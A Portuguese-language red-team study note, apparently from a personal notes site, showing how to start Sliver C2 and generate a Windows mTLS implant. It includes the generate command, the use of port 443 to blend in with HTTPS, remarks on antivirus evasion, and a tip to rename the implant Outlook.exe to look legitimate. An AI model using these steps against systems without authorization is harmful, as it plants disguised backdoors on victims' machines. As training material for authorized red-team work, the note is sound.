> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/sliver-c2/listener-and-implant-creation/gerando-o-primeiro-implant-mtls-windows.md).

# Gerando o Primeiro Implant (MTLS - Windows)

**Implantes** são cargas maliciosas implantadas em um sistema alvo para estabelecer acesso e controle remoto. Simplificando, eles são a essência da **pós-exploração** . Pense neles como backdoors, mas com mais recursos.

**Abrir o Sliver**

* Inicie o Kali Linux
* Abra o terminal
* Execute:

```
sliver
```

* Se não funcionar:

```
sudo systemctl start sliver
```

**Gerar o implant**

Use o comando `generate` definindo protocolo, IP, porta e sistema alvo.

```
generate --mtls <SEU_IP>:443 --os windows --arch amd64 --save /home/kali
```

Parâmetros:

* `--mtls` → comunicação segura (criptografada)
* `<SEU_IP>:443` → IP do C2 + porta (443 ajuda a camuflar como HTTPS)
* `--os windows` → alvo Windows (gera `.exe`)
* `--save` → diretório de saída

**Entendendo o processo**

* **Compilação dinâmica**:
  * Cada implant gerado é único
  * Dificulta detecção por antivírus baseado em assinatura
* **Ofuscação básica**:
  * Ajuda na evasão inicial
  * Pode não ser suficiente contra EDRs avançados

**Renomear o implant (opcional)**

Boa prática para reduzir suspeita.

```
mv <NOME_IMPLANT>.exe Outlook.exe
```

Exemplo:

* Nome original: aleatório
* Novo nome: `Outlook.exe` (parece legítimo)
